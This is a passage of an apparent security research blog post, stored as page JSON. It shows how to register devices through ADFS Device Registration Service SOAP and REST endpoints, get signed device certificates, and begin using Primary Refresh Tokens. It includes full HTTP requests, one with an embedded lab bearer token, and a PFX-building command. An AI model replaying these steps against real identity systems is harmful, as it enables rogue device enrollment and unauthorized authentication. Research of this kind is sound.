\u003C\u002Fs:Body\u003E\n\u003C\u002Fs:Envelope\u003E","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_120":{"__typename":"Paragraph","id":"6c2350f1b8ff_120","name":"b2a3","type":"P","href":null,"layout":null,"metadata":null,"text":"The important fields here are:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_121":{"__typename":"Paragraph","id":"6c2350f1b8ff_121","name":"2836","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Header BinarySecurityToken - This is the base64 encoded access_token we retrieved during authentication","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":7,"end":26,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":56,"end":68,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_122":{"__typename":"Paragraph","id":"6c2350f1b8ff_122","name":"ba1e","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Body BinarySecurityToken - PKCS#10 encoded CSR generated by us for signing","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":5,"end":24,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_123":{"__typename":"Paragraph","id":"6c2350f1b8ff_123","name":"d53c","type":"P","href":null,"layout":null,"metadata":null,"text":"When we make this request, we receive a response with a signed certificate:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_124":{"__typename":"Paragraph","id":"6c2350f1b8ff_124","name":"ce5c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HTTP\u002F1.1 200 OK\nContent-Length: 3866\nContent-Type: application\u002Fsoap+xml; charset=utf-8\nServer: Microsoft-HTTPAPI\u002F2.0\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nDate: Sat, 14 Dec 2024 21:29:05 GMT\n\n\u003Cs:Envelope xmlns:s=\"http:\u002F\u002Fwww.w3.org\u002F2003\u002F05\u002Fsoap-envelope\" xmlns:a=\"http:\u002F\u002Fwww.w3.org\u002F2005\u002F08\u002Faddressing\"\u003E\u003Cs:Header\u003E\u003Ca:Action s:mustUnderstand=\"1\"\u003Ehttp:\u002F\u002Fschemas.microsoft.com\u002Fwindows\u002Fpki\u002F2009\u002F01\u002Fenrollment\u002FRSTRC\u002Fwstep\u003C\u002Fa:Action\u003E\u003Ca:RelatesTo\u003Eurn:uuid:0d5a1441-5891-453b-becf-a2e5f6ea3749\u003C\u002Fa:RelatesTo\u003E\u003C\u002Fs:Header\u003E\u003Cs:Body\u003E\u003CRequestSecurityTokenResponseCollection xmlns=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fws-sx\u002Fws-trust\u002F200512\"\u003E\u003CRequestSecurityTokenResponse\u003E\u003CTokenType\u003Ehttp:\u002F\u002Fschemas.microsoft.com\u002F5.0.0.0\u002FConfigurationManager\u002FEnrollment\u002FDeviceEnrollmentToken\u003C\u002FTokenType\u003E\u003CRequestedSecurityToken\u003E\u003CBinarySecurityToken ValueType=\"http:\u002F\u002Fschemas.microsoft.com\u002F5.0.0.0\u002FConfigurationManager\u002FEnrollment\u002FDeviceEnrollmentProvisionDoc\" EncodingType=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fwss\u002F2004\u002F01\u002Foasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary\" xmlns=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fwss\u002F2004\u002F01\u002Foasis-200401-wss-wssecurity-secext-1.0.xsd\"\u003EPHdhcC1wcm92aXNpb25pbmdkb2MgdmVyc2lvbj0iMS4xIj4NCiAgPGNoYXJhY3RlcmlzdGljIHR5&#xD;\ncGU9IkNlcnRpZmljYXRlU3RvcmUiPg0KICAgIDxjaGFyYWN0ZXJpc3RpYyB0eXBlPSJNeSI+DQog&#xD;\n[...]\nOERmUSswS25ENjY3aTZvWlk0RTY3eGhCYVA3dG1Sb24xR0xucENYQzBzeGoiIC8+DQogICAgICAg&#xD;\nIDwvY2hhcmFjdGVyaXN0aWM+DQogICAgICA8L2NoYXJhY3RlcmlzdGljPg0KICAgIDwvY2hhcmFj&#xD;\ndGVyaXN0aWM+DQogIDwvY2hhcmFjdGVyaXN0aWM+DQo8L3dhcC1wcm92aXNpb25pbmdkb2M+\u003C\u002FBinarySecurityToken\u003E\u003C\u002FRequestedSecurityToken\u003E\u003CRequestID xmlns=\"http:\u002F\u002Fschemas.microsoft.com\u002Fwindows\u002Fpki\u002F2009\u002F01\u002Fenrollment\"\u003E0\u003C\u002FRequestID\u003E\u003CAdditionalContext xmlns=\"http:\u002F\u002Fschemas.xmlsoap.org\u002Fws\u002F2006\u002F12\u002Fauthorization\"\u003E\u003CContextItem Name=\"UserPrincipalName\"\u003E\u003CValue\u003Eitadmin@lab.local\u003C\u002FValue\u003E\u003C\u002FContextItem\u003E\u003C\u002FAdditionalContext\u003E\u003C\u002FRequestSecurityTokenResponse\u003E\u003C\u002FRequestSecurityTokenResponseCollection\u003E\u003C\u002Fs:Body\u003E\u003C\u002Fs:Envelope\u003E","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_125":{"__typename":"Paragraph","id":"6c2350f1b8ff_125","name":"cc25","type":"P","href":null,"layout":null,"metadata":null,"text":"Unfortunately this isn’t going to be another ESC99 style attack as the CA used to sign the token is the ADFS internal CA rather than ADCS (I can read your mind). But we’ll need this when using Device Authentication later.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_126":{"__typename":"Paragraph","id":"6c2350f1b8ff_126","name":"ce22","type":"P","href":null,"layout":null,"metadata":null,"text":"If we take this base64 encoded certificate and decode it we get something like this:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_127":{"__typename":"Paragraph","id":"6c2350f1b8ff_127","name":"6910","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\u003Cwap-provisioningdoc version=\"1.1\"\u003E\n  \u003Ccharacteristic type=\"CertificateStore\"\u003E\n    \u003Ccharacteristic type=\"My\"\u003E\n      \u003Ccharacteristic type=\"User\"\u003E\n        \u003Ccharacteristic type=\"E2246E3845E4928781128D6A4832B84EF1149FAF\"\u003E\n          \u003Cparm name=\"EncodedCertificate\" value=\"MIID\u002FjCCAuagAwIBAgIQXXMccvjIsqdJ3Rd5smED[...]gDO1wJL3j\" \u002F\u003E\n        \u003C\u002Fcharacteristic\u003E\n      \u003C\u002Fcharacteristic\u003E\n    \u003C\u002Fcharacteristic\u003E\n  \u003C\u002Fcharacteristic\u003E\n\u003C\u002Fwap-provisioningdoc\u003E","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_128":{"__typename":"Paragraph","id":"6c2350f1b8ff_128","name":"804a","type":"P","href":null,"layout":null,"metadata":null,"text":"We take the EncodedCertificate value and base64 decode this to generate our signed public key certificate. Usually it’s best to combine this with the private key into a PFX with something like:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":12,"end":30,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_129":{"__typename":"Paragraph","id":"6c2350f1b8ff_129","name":"9042","type":"PRE","href":null,"layout":null,"metadata":null,"text":"openssl pkcs12 -export -out device_cert.pfx -inkey private_key.pem -in device_registration.crt","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_130":{"__typename":"Paragraph","id":"6c2350f1b8ff_130","name":"def5","type":"P","href":null,"layout":null,"metadata":null,"text":"So once we have completed this SOAP request and we have our signed certificate, in Active Directory, we’ll find our new msDS-Device object:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":120,"end":131,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*O5GL5ZmpFmzDXGD7OkdGIA.png":{"__typename":"ImageMetadata","id":"1*O5GL5ZmpFmzDXGD7OkdGIA.png","originalHeight":633,"originalWidth":556,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_131":{"__typename":"Paragraph","id":"6c2350f1b8ff_131","name":"1d07","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*O5GL5ZmpFmzDXGD7OkdGIA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_132":{"__typename":"Paragraph","id":"6c2350f1b8ff_132","name":"3120","type":"P","href":null,"layout":null,"metadata":null,"text":"If we are shooting for accessing ADFS using ClientTLS, this should be enough. However as we’ll see later on when looking at SignedToken, there are a few issues with this SOAP API method of creating a new msDS-Device. The big one for us is that the msDS-KeyCredentialLink attribute isn’t populated in AD (for anyone who has explored Entra ID before, you’ll likely know that this is required for the session transport key used during the PRT provisioning process).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":44,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":124,"end":135,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":204,"end":215,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":248,"end":270,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_133":{"__typename":"Paragraph","id":"6c2350f1b8ff_133","name":"610c","type":"P","href":null,"layout":null,"metadata":null,"text":"As a side note, I “think” that this web service was actually used to support an earlier iteration of DRS, before Entra ID was so tightly integrated with Windows. During the Windows 8 days, DRS was a simpler method of generating certificates for device authentication and using ClientTLS, which makes sense as to why the msDS-KeyCredentialLink parameter was never used… but this is just a guess.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":277,"end":286,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":320,"end":342,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_134":{"__typename":"Paragraph","id":"6c2350f1b8ff_134","name":"7b7b","type":"H3","href":null,"layout":null,"metadata":null,"text":"EnrollmentServer REST API","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_135":{"__typename":"Paragraph","id":"6c2350f1b8ff_135","name":"849e","type":"P","href":null,"layout":null,"metadata":null,"text":"The second endpoint referenced in the \u002FEnrollmentServer\u002Fcontract endpoint is the \u002FEnrollmentServer\u002Fdevice\u002F service:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":38,"end":64,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":81,"end":106,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*F9VUBqJ4BMwQm6Lk9g3qYA.png":{"__typename":"ImageMetadata","id":"1*F9VUBqJ4BMwQm6Lk9g3qYA.png","originalHeight":316,"originalWidth":940,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_136":{"__typename":"Paragraph","id":"6c2350f1b8ff_136","name":"9986","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*F9VUBqJ4BMwQm6Lk9g3qYA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_137":{"__typename":"Paragraph","id":"6c2350f1b8ff_137","name":"b8dc","type":"P","href":null,"layout":null,"metadata":null,"text":"Again this may look familiar as it’s a clone of the https:\u002F\u002Fenterpriseregistration.windows.net\u002FEnrollmentServer\u002Fdevice\u002F service used during Entra device registration.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":52,"end":119,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":52,"end":119,"href":"https:\u002F\u002Fenterpriseregistration.windows.net\u002FEnrollmentServer\u002Fdevice\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_138":{"__typename":"Paragraph","id":"6c2350f1b8ff_138","name":"49fc","type":"P","href":null,"layout":null,"metadata":null,"text":"This REST API is the more complete way to create a new msDS-Device as it allows us to provide values for the msDS-KeyCredentialLink (huge thanks to @DrAzureAD and the post “Deep-dive to Azure AD device join” which saved a lot of time and effort uncovering the structure of this request, you’re contributions to the infosec scene are always appreciated!):","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":55,"end":66,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":109,"end":131,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":148,"end":158,"href":"https:\u002F\u002Fx.com\u002FDrAzureAD","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":172,"end":207,"href":"https:\u002F\u002Faadinternals.com\u002Fpost\u002Fdevices\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_139":{"__typename":"Paragraph","id":"6c2350f1b8ff_139","name":"96a3","type":"PRE","href":null,"layout":null,"metadata":null,"text":"POST https:\u002F\u002Fadfs.lab.local\u002FEnrollmentServer\u002Fdevice\u002F?api-version=1.0 HTTP\u002F1.1\nContent-Type: application\u002Fsoap+xml; charset=utf-8\nUser-Agent: dd762716-544d-4aeb-a526-687b73838a22\nHost: adfs.lab.local\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkFZcS1lSE5wVHdmcnFxVHcwM3k0d3NJRTBHUSIsImtpZCI6IkFZcS1lSE5wVHdmcnFxVHcwM3k0d3NJRTBHUSJ9.eyJhdWQiOiJ1cm46bXMtZHJzOjQzNERGNEE5LTNDRjItNEMxRC05MTdFLTJDRDJCNzJGNTE1QSIsImlzcyI6Imh0dHA6Ly9hZGZzLmxhYi5sb2NhbC9hZGZzL3NlcnZpY2VzL3RydXN0IiwiaWF0IjoxNzM0MzA2NDc1LCJuYmYiOjE3MzQzMDY0NzUsImV4cCI6MTczNDMxMDA3NSwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvaW1wbGljaXR1cG4iOiJpdGFkbWluQGxhYi5sb2NhbCIsInJzIjoibm90ZXZhbHVhdGVkIiwidGhyb3R0bGVkIjoiZmFsc2UiLCJhbXAiOiJGb3Jtc0F1dGhlbnRpY2F0aW9uIiwiYXV0aF90aW1lIjoiMjAyNC0xMi0xNVQyMzo0Nzo1NC44NjdaIiwiYXV0aG1ldGhvZCI6InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0IiwiYW5jaG9yIjoid2luYWNjb3VudG5hbWUiLCJ1cG4iOiJpdGFkbWluQGxhYi5sb2NhbCIsInByaW1hcnlzaWQiOiJTLTEtNS0yMS0zODU5Mjg2ODc4LTI4NTc1NjM3MjQtMTA1OTM5NjI5Ny0xMDAwIiwidW5pcXVlX25hbWUiOiJsYWJcXGl0YWRtaW4iLCJ3aW5hY2NvdW50bmFtZSI6ImxhYlxcaXRhZG1pbiIsImFtciI6InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0IiwiYXBwaWQiOiJkZDc2MjcxNi01NDRkLTRhZWItYTUyNi02ODdiNzM4MzhhMjIiLCJhcHB0eXBlIjoiUHVibGljIiwiY2xpZW50dXNlcmFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNiIsImVuZHBvaW50cGF0aCI6Ii9hZGZzL29hdXRoMi9hdXRob3JpemUiLCJpbnNpZGVjb3JwbmV0d29yayI6ImZhbHNlIiwicHJveHkiOiJBREZTUHJveHkiLCJjbGllbnRyZXFpZCI6IjEwMWNjYzI3LTMwNDgtNGJlMi0wYTAwLTAwODAwMDAwMDBlMyIsImNsaWVudGlwIjoiMTkyLjE2OC4xMzAuMTAiLCJmb3J3YXJkZWRjbGllbnRpcCI6IjEwMC43Ny45NC41MSIsInVzZXJpcCI6IjEwMC43Ny45NC41MSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaXphdGlvbi9jbGFpbXMvUGVybWl0RGV2aWNlUmVnaXN0cmF0aW9uIjoidHJ1ZSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaXphdGlvbi9jbGFpbXMvZGV2aWNlcmVnaXN0cmF0aW9ucXVvdGEiOiIyMTQ3NDgzNjQ3IiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9hdXRob3JpemF0aW9uL2NsYWltcy9hY2NvdW50U3RvcmUiOiJBRCBBVVRIT1JJVFkiLCJ2ZXIiOiIxLjAifQ.UuHeR9KWONFQnxC0hnppid1HgCA5dZZ9Xw9RCZn9bTHkBUZzJ_fquD19z2OWJhQOg1VBr4yVlYTHwqJELmYEiCsSXX5iMkSK0GMoZywPP4N1yvgtgEpnYHxYSKhM3M7tj1s2HfsWxTAS7d6dm95y3rujIZOeWghN9XxAX6rn2x7ZRFvhffB3XGbTEiK9-WByawJtA0yjr5bg2zzykbPPFlA9j1M5ql94K5tvcP0zXA5i74n5I55KgnEO-Ba9gWu0FTBo0R4Gjuwfu6vFQ-GYCeWSVQjTeVg66G3IGB5JE8O2Ko94XQ-IGy5aNj0sdcDE0Zw3cV9PaVb7n6QDy0mAig\nContent-Length: 1792\nCache-Control: no-cache\n\n {\n \"TransportKey\": \"UlNBMQAIAAADA[...]Gckayg68kIQ9iGtkxN52fQ==\",\n  \"JoinType\":4,\n  \"DeviceDisplayName\": \"New Test Device\",\n  \"OSVersion\":  \"Windows 6.1.2.3\",\n  \"CertificateRequest\":  {\n     \"Type\":  \"pkcs10\",\n     \"Data\":  \"MIICijCCAXICAm6G5l[...]B1KAjEaLjcav\u002FsOBzZhLRxoMXIJ7lClxV7\"\n  },\n  \"TargetDomain\":  \"lab.local\",\n  \"DeviceType\":  \"x64\",\n  \"Attributes\":  {\n      \"ReuseDevice\":  true,\n      \"ReturnClientSid\":  true,\n      \"SharedDevice\":  false\n  }\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_140":{"__typename":"Paragraph","id":"6c2350f1b8ff_140","name":"4a6d","type":"P","href":null,"layout":null,"metadata":null,"text":"We authenticate to this service using a more traditional Authorization header, providing our DRS Access Token as a bearer.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":57,"end":70,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_141":{"__typename":"Paragraph","id":"6c2350f1b8ff_141","name":"4784","type":"P","href":null,"layout":null,"metadata":null,"text":"Again a few additional things to note with the body of this request. The first is the JoinType. This can be set to one of the following values (not all are actually supported unfortunately):","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":86,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_142":{"__typename":"Paragraph","id":"6c2350f1b8ff_142","name":"8852","type":"PRE","href":null,"layout":null,"metadata":null,"text":"namespace Microsoft.DeviceRegistration.Entities\n{\n\tpublic enum JoinType\n\t{\n\t\tDeviceJoin, \u002F\u002F 0\n\t\tDeviceUserJoin, \u002F\u002F 1\n\t\tDeviceRenew, \u002F\u002F 2 \n\t\tDeviceUserRenew, \u002F\u002F 3\n\t\tWorkplaceJoin, \u002F\u002F 4\n\t\tWorkplaceRenew, \u002F\u002F 5\n\t\tDomainJoin, \u002F\u002F 6\n\t\tUnJoin \u002F\u002F 7\n\t}\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_143":{"__typename":"Paragraph","id":"6c2350f1b8ff_143","name":"13b0","type":"P","href":null,"layout":null,"metadata":null,"text":"There is now also the TransportKey value which was missing in the earlier service call.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":22,"end":34,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_144":{"__typename":"Paragraph","id":"6c2350f1b8ff_144","name":"49b4","type":"P","href":null,"layout":null,"metadata":null,"text":"The response to this is again the signed certificate:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_145":{"__typename":"Paragraph","id":"6c2350f1b8ff_145","name":"3e84","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HTTP\u002F1.1 200 OK\nContent-Length: 1552\nContent-Type: application\u002Fjson\n...\n\n{\n  \"Certificate\":{\n    \"Thumbprint\":\"C367257B04D86A371A04E58256CE96687F91CBB4\",\n    \"RawBody\":\"MIID\u002FjCCAuagA[...]oQz0JVEdcZBfPhPAadyLFvjS6KiieWwQwsop2+R\"\n  },\n  \"User\":{\n    \"Upn\":\"itadmin@lab.local\"\n  },\n  \"MembershipChanges\":[\n  {\n    \"LocalSID\":\"S-1-5-32-544\",\n    \"AddSIDs\":[]\n  }]\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"css"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_146":{"__typename":"Paragraph","id":"6c2350f1b8ff_146","name":"16c4","type":"P","href":null,"layout":null,"metadata":null,"text":"Again this results in a new msDS-Device object, but now with the msDS-KeyCredentialLink attribute populated to our TransportKey value:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":28,"end":39,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":65,"end":87,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":115,"end":127,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*gGAiBlc9XV4FvTUwEsvexQ.png":{"__typename":"ImageMetadata","id":"1*gGAiBlc9XV4FvTUwEsvexQ.png","originalHeight":249,"originalWidth":470,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_147":{"__typename":"Paragraph","id":"6c2350f1b8ff_147","name":"7fe2","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*gGAiBlc9XV4FvTUwEsvexQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_148":{"__typename":"Paragraph","id":"6c2350f1b8ff_148","name":"b9c5","type":"P","href":null,"layout":null,"metadata":null,"text":"So now we can enrol our devices, how do we actually go about authenticating ourselves using the Device Authentication methods explored earlier?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_149":{"__typename":"Paragraph","id":"6c2350f1b8ff_149","name":"aec7","type":"P","href":null,"layout":null,"metadata":null,"text":"Well we’ve already discussed ClientTLS quite a bit in this post, which is your basic Certificate Authentication (I usually just use Burp Suite for this):","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":29,"end":38,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*KEhQ_NwFTrC76_PYrm15cA.png":{"__typename":"ImageMetadata","id":"1*KEhQ_NwFTrC76_PYrm15cA.png","originalHeight":636,"originalWidth":2026,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_150":{"__typename":"Paragraph","id":"6c2350f1b8ff_150","name":"1f7c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*KEhQ_NwFTrC76_PYrm15cA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_151":{"__typename":"Paragraph","id":"6c2350f1b8ff_151","name":"f719","type":"P","href":null,"layout":null,"metadata":null,"text":"But what about if ClientTLS isn’t in use?","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":18,"end":27,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_152":{"__typename":"Paragraph","id":"6c2350f1b8ff_152","name":"82cd","type":"H3","href":null,"layout":null,"metadata":null,"text":"Enterprise Primary Refresh Token","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_153":{"__typename":"Paragraph","id":"6c2350f1b8ff_153","name":"3a20","type":"P","href":null,"layout":null,"metadata":null,"text":"Another new discovery for me, was that Primary Refresh Tokens are supported on ADFS. And as we saw earlier, this is the default method of Device Authentication supported after ADFS 2016 as SignedToken.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":189,"end":200,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_154":{"__typename":"Paragraph","id":"6c2350f1b8ff_154","name":"7509","type":"P","href":null,"layout":null,"metadata":null,"text":"This works mostly in the same way as Entra ID, so it’s essential that I give a massive shout out to @_dirkjan and his epic work in this area with ROADTools, blog posts and training. His work and sharing of knowledge provided a huge portion of examples and code to work with while looking at this on ADFS.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":100,"end":109,"href":"https:\u002F\u002Fx.com\u002F_dirkjan?lang=en-GB","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":146,"end":156,"href":"https:\u002F\u002Fgithub.com\u002Fdirkjanm\u002FROADtools","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":157,"end":167,"href":"https:\u002F\u002Fdirkjanm.io\u002Fdigging-further-into-the-primary-refresh-token\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":172,"end":180,"href":"https:\u002F\u002Foutsidersecurity.nl\u002Ftraining\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_155":{"__typename":"Paragraph","id":"6c2350f1b8ff_155","name":"f1a5","type":"P","href":null,"layout":null,"metadata":null,"text":"So first we need a nonce value which is requested from 